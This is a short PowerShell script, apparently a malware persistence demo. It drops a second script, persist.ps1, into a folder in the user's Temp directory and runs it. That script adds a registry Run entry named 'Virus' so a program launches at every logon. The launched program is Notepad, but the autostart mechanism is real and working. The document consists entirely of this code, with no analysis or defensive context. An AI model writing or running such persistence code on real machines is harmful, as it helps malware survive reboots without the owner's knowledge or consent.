$user = $env:USERNAME
$place = "C:\Users\$user\AppData\Local\Temp"

$file = "REG007"
Set-Location $place

$ps1 = "persist.ps1"

if( -not ( Test-Path $file ) ) { New-Item -ItemType Directory -Name $file }

if( -not ( Test-Path $ps1 ) ) { echo "`$path = `"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`"
New-ItemProperty -Path `$path -Name `"Virus`" -Value `"Notepad.exe`" -Force" > $place\$file\$ps1 }
Set-Location $place\$file
.".\persist.ps1"